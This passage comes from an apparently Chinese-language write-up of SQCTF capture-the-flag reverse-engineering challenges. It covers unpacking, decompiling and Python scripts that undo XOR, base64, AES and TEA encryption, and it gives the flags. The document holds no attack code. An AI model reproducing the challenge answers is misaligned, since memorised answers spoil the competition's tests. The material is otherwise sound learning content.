class="string">f&quot;<span class="subst">&#123;solution.encode(<span class="string">&#x27;latin-1&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SQCTF&#123;easy_re_vm\x00&#x27;</span></span><br><span class="line"><span class="comment"># 改成SQCTF&#123;easy_re_vm&#125;提交就行</span></span><br></pre></td></tr></table></figure><h3 id="往事暗沉不可追"><a href="#往事暗沉不可追" class="headerlink" title="往事暗沉不可追"></a>往事暗沉不可追</h3><p>又是熟悉的图标</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-17.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-18.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: ����֮·��������.pyc (Python 3.10)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleVM</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.memory = [</span><br><span class="line">            <span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        self.registers = [</span><br><span class="line">            <span class="number">0</span>] * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">self, reg, addr</span>):</span><br><span class="line">        self.registers[reg] = self.memory[addr]</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">self, reg, addr</span>):</span><br><span class="line">        self.memory[addr] = self.registers[reg]</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">self, reg, value</span>):</span><br><span class="line">        self.registers[reg] ^= value</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, bytecode</span>):</span><br><span class="line">        ip = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ip &lt; <span class="built_in">len</span>(bytecode):</span><br><span class="line">            op = bytecode[ip]</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&#x27;LOAD&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                addr = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.load(reg, addr)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;STORE&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                addr = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.store(reg, addr)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;XOR&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                value = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.xor(reg, value)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&#x27;&#x27;&#x27;Unknown opcode: <span class="subst">&#123;op&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="literal">None</span> &lt; <span class="built_in">len</span>(bytecode):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_memory</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.memory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bytecode = [</span><br><span class="line">    <span class="string">&#x27;LOAD&#x27;</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">16</span>,</span><br><span class="line">    <span class="string">&#x27;XOR&#x27;</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">85</span>,</span><br><span class="line">    <span class="string">&#x27;STORE&#x27;</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">32</span>,</span><br><span class="line">    <span class="string">&#x27;LOAD&#x27;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">32</span>,</span><br><span class="line">    <span class="string">&#x27;XOR&#x27;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">170</span>,</span><br><span class="line">    <span class="string">&#x27;STORE&#x27;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">48</span>]</span><br><span class="line">encrypted_data = [</span><br><span class="line">    <span class="number">127</span>,</span><br><span class="line">    <span class="number">131</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">135</span>,</span><br><span class="line">    <span class="number">127</span>,</span><br><span class="line">    <span class="number">133</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">131</span>,</span><br><span class="line">    <span class="number">127</span>,</span><br><span class="line">    <span class="number">135</span>,</span><br><span class="line">    <span class="number">131</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">135</span>,</span><br><span class="line">    <span class="number">125</span>]</span><br><span class="line">vm = SimpleVM()</span><br><span class="line">vm.memory[<span class="number">16</span>:<span class="number">16</span> + <span class="built_in">len</span>(encrypted_data)] = encrypted_data</span><br><span class="line">vm.execute(bytecode)</span><br><span class="line">final_memory = vm.get_memory()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>逆向脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleVM</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.memory = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        self.registers = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">self, reg, addr</span>):</span><br><span class="line">        self.registers[reg] = self.memory[addr]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">self, reg, addr</span>):</span><br><span class="line">        self.memory[addr] = self.registers[reg]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">self, reg, value</span>):</span><br><span class="line">        self.registers[reg] ^= value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, bytecode</span>):</span><br><span class="line">        ip = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> ip &lt; <span class="built_in">len</span>(bytecode):</span><br><span class="line">            op = bytecode[ip]</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&#x27;LOAD&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                addr = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.load(reg, addr)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;STORE&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                addr = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.store(reg, addr)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;XOR&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                value = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.xor(reg, value)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown opcode: <span class="subst">&#123;op&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_memory</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.memory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的加密数据和字节码</span></span><br><span class="line">encrypted_data = [<span class="number">127</span>, <span class="number">131</span>, <span class="number">125</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">127</span>, <span class="number">133</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">131</span>, <span class="number">127</span>, <span class="number">135</span>, <span class="number">131</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">125</span>]</span><br><span class="line">bytecode = [</span><br><span class="line">    <span class="string">&#x27;LOAD&#x27;</span>, <span class="number">0</span>, <span class="number">16</span>,</span><br><span class="line">    <span class="string">&#x27;XOR&#x27;</span>, <span class="number">0</span>, <span class="number">85</span>,</span><br><span class="line">    <span class="string">&#x27;STORE&#x27;</span>, <span class="number">0</span>, <span class="number">32</span>,</span><br><span class="line">    <span class="string">&#x27;LOAD&#x27;</span>, <span class="number">1</span>, <span class="number">32</span>,</span><br><span class="line">    <span class="string">&#x27;XOR&#x27;</span>, <span class="number">1</span>, <span class="number">170</span>,</span><br><span class="line">    <span class="string">&#x27;STORE&#x27;</span>, <span class="number">1</span>, <span class="number">48</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化虚拟机并加载加密数据</span></span><br><span class="line">vm = SimpleVM()</span><br><span class="line">vm.memory[<span class="number">16</span>:<span class="number">16</span> + <span class="built_in">len</span>(encrypted_data)] = encrypted_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行字节码</span></span><br><span class="line">vm.execute(bytecode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取最终内存中的解密数据</span></span><br><span class="line">final_memory = vm.get_memory()</span><br><span class="line">decrypted_data = final_memory[<span class="number">48</span>:<span class="number">48</span> + <span class="built_in">len</span>(encrypted_data)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接计算：两次异或等价于异或 85 ^ 170 = 255</span></span><br><span class="line">direct_decrypt = [x ^ <span class="number">255</span> <span class="keyword">for</span> x <span class="keyword">in</span> encrypted_data]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的数据转换为flag格式</span></span><br><span class="line">flag = <span class="string">&quot;SQCTF&#123;&quot;</span> + <span class="string">&quot;,&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, direct_decrypt)) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"><span class="comment"># Flag: SQCTF&#123;128,124,130,132,120,128,122,132,130,124,128,120,124,132,120,130&#125;</span></span><br></pre></td></tr></table></figure><h3 id="遇事不决，可问春风"><a href="#遇事不决，可问春风" class="headerlink" title="遇事不决，可问春风"></a>遇事不决，可问春风</h3><p>一个APK文件，用jadx打开</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-19.png"></p><p>逆向步骤如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义加密部分和异或密钥</span></span><br><span class="line">ENCRYPTED_PARTS = [<span class="string">&quot;5&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;7&quot;</span>]</span><br><span class="line">XOR_KEY = <span class="number">66</span>  <span class="comment"># &#x27;B&#x27; 的 ASCII 值</span></span><br><span class="line">FLAG_PREFIX = <span class="string">&quot;SQCTF&#123;i_am_a_&quot;</span></span><br><span class="line">FLAG_SUFFIX = <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1：拼接加密字符串</span></span><br><span class="line">encrypted_str = <span class="string">&quot;&quot;</span>.join(ENCRYPTED_PARTS)  <span class="comment"># 得到 &quot;5#)75#)7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2：异或解密每个字符</span></span><br><span class="line">decrypted_password = <span class="string">&quot;&quot;</span>.join([</span><br><span class="line">    <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ XOR_KEY)  <span class="comment"># 字符逐个异或解密</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encrypted_str</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3：构建完整 Flag</span></span><br><span class="line">flag = <span class="string">f&quot;<span class="subst">&#123;FLAG_PREFIX&#125;</span><span class="subst">&#123;decrypted_password&#125;</span><span class="subst">&#123;FLAG_SUFFIX&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># Flag: SQCTF&#123;i_am_a_wakuwaku&#125;</span></span><br></pre></td></tr></table></figure><h3 id="春风也有春风愁"><a href="#春风也有春风愁" class="headerlink" title="春风也有春风愁"></a>春风也有春风愁</h3><p>无壳，直接扔IDA</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-20.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-21.png"></p><p>一个简单的XOR</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v6 = [</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0x0B</span>, <span class="number">0xFD</span>, <span class="number">0x08</span>, <span class="number">0xFA</span>, <span class="number">0x15</span>, <span class="number">0xF7</span>, <span class="number">0xFB</span>,</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x31</span>, <span class="number">0x14</span>, <span class="number">0x01</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> v6:</span><br><span class="line">    decrypted = ((b - <span class="number">55</span>) &amp; <span class="number">0xFF</span>) ^ <span class="number">0xA5</span></span><br><span class="line">    flag.append(decrypted)</span><br><span class="line"></span><br><span class="line">flag_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag_str)</span><br><span class="line"><span class="comment"># Flag: sqctf&#123;easy_xor&#125;</span></span><br></pre></td></tr></table></figure><h3 id="唧唧复唧唧，木兰当户织"><a href="#唧唧复唧唧，木兰当户织" class="headerlink" title="唧唧复唧唧，木兰当户织"></a>唧唧复唧唧，木兰当户织</h3><p>拉进Die可以看到加了UPX的壳</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-22.png"></p><p>脱壳后扔到IDA查看</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-23.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-24.png"></p><p>就一个简单的base64解码</p><p>把解出来的flag里的中文逗号换成英文逗号就行<code>SQCTF&#123;xixibuxixi,mulandanghuzhi&#125;</code></p><h3 id="看山不是山"><a href="#看山不是山" class="headerlink" title="看山不是山"></a>看山不是山</h3><p>用<code>Exeinfo PE</code>查看是一个python打包的程序</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-25.png"></p><p>用经典的python逆向工具把源码跑出来</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-26.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_target</span>():</span><br><span class="line">    target = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;738495a6b7c8d9e0f123456789abcdef&#x27;</span>)</span><br><span class="line">    key = <span class="number">439041101</span></span><br><span class="line">    key_bytes = [(key &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        encrypted_byte = target[i]</span><br><span class="line">        kb = key_bytes[i % <span class="number">4</span>]</span><br><span class="line">        <span class="comment"># 逆向步骤：先减去i，再异或密钥字节</span></span><br><span class="line">        temp = (encrypted_byte - i) % <span class="number">256</span></span><br><span class="line">        original = temp ^ kb</span><br><span class="line">        data.append(original)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(data)</span><br><span class="line"></span><br><span class="line">data_decrypted = decrypt_target()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Data (hex):&quot;</span>, data_decrypted.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># &quot;Decrypted Data (hex): 3ebfb8b9fefff8c3a426104630a294fa</span></span><br></pre></td></tr></table></figure><p>flag为<code>SQCTF&#123;3ebfb8b9fefff8c3a426104630a294fa&#125;</code></p><h3 id="即随本心"><a href="#即随本心" class="headerlink" title="即随本心"></a>即随本心</h3><p>用<code>Exeinfo PE</code>查看是一个python打包的程序</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-27.png"></p><p>用经典的python逆向工具把源码跑出来</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-28.png"></p><p>AES_CBC加密，而且密钥和IV都给出来了，赛博厨子梭哈</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-29.png"></p><h3 id="击败abyssun"><a href="#击败abyssun" class="headerlink" title="击败abyssun"></a>击败abyssun</h3><p>用<code>Exeinfo PE</code>查看是一个python打包的程序</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-30.png"></p><p>直接用<code>pycdc.exe</code>无法逆向出完整代码</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-31.png"></p><p>用<code>pycdas.exe</code>查看字节码，没想到直接找到flag，连ce改血都不需要</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-32.png"></p><h3 id="天下谁人不识君"><a href="#天下谁人不识君" class="headerlink" title="天下谁人不识君"></a>天下谁人不识君</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;v7b3boika$h4h5j0jhkh161h79393i5x010j0y8n$i&#x27;</span></span><br><span class="line"></span><br><span class="line">pairs = [(result[<span class="number">2</span>*i], result[<span class="number">2</span>*i+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)//<span class="number">2</span>)]</span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, (c1, c2) <span class="keyword">in</span> <span class="built_in">enumerate</span>(pairs):</span><br><span class="line">    pos1 = s.index(c1)</span><br><span class="line">    s1 = (pos1 - i) % <span class="number">34</span></span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span> <span class="keyword">or</span> s1 &gt; <span class="number">15</span>:</span><br><span class="line">        <span class="keyword">continue</span>  <span class="comment"># 忽略无效的s1</span></span><br><span class="line">    </span><br><span class="line">    pos2 = s.index(c2)</span><br><span class="line">    s2 = (<span class="number">33</span> - pos2 - i) % <span class="number">17</span></span><br><span class="line">    computed_pos2 = (- (s2 + i + <span class="number">1</span>)) % <span class="number">34</span></span><br><span class="line">    <span class="keyword">if</span> computed_pos2 != pos2:</span><br><span class="line">        <span class="keyword">continue</span>  <span class="comment"># 验证失败</span></span><br><span class="line">    </span><br><span class="line">    original_char = s1 * <span class="number">17</span> + s2</span><br><span class="line">    flag.append(<span class="built_in">chr</span>(original_char))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"><span class="comment"># SQCTF&#123;libai_jianxian&#125;</span></span><br></pre></td></tr></table></figure><h3 id="你若安好便是晴"><a href="#你若安好便是晴" class="headerlink" title="你若安好便是晴"></a>你若安好便是晴</h3><p>无壳，直接扔IDA</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-33.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-34.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-35.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-36.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-37.png"></p><p>一个TEA加密，写个脚本进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt</span>(<span class="params">block, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解密一个 64 位块（由两个 32 位无符号整数组成），</span></span><br><span class="line"><span class="string">    使用标准的 TEA 解密算法（32 轮，采用小端序）。</span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">      block -- 长度为8的字节串</span></span><br><span class="line"><span class="string">      key   -- 长度为4的无符号整数列表</span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">      解密后的两个 32 位整数组成的列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 从 block 中读取两个 32 位整数 (小端格式)</span></span><br><span class="line">    v0, v1 = struct.unpack(<span class="string">&quot;&lt;II&quot;</span>, block)</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line">    <span class="comment"># 初始和 = delta * 32 (注意使用无符号32位运算)</span></span><br><span class="line">    s = (delta * <span class="number">32</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="comment"># TEA 解密轮：先解 v1，再解 v0，均做 32 位无符号运算</span></span><br><span 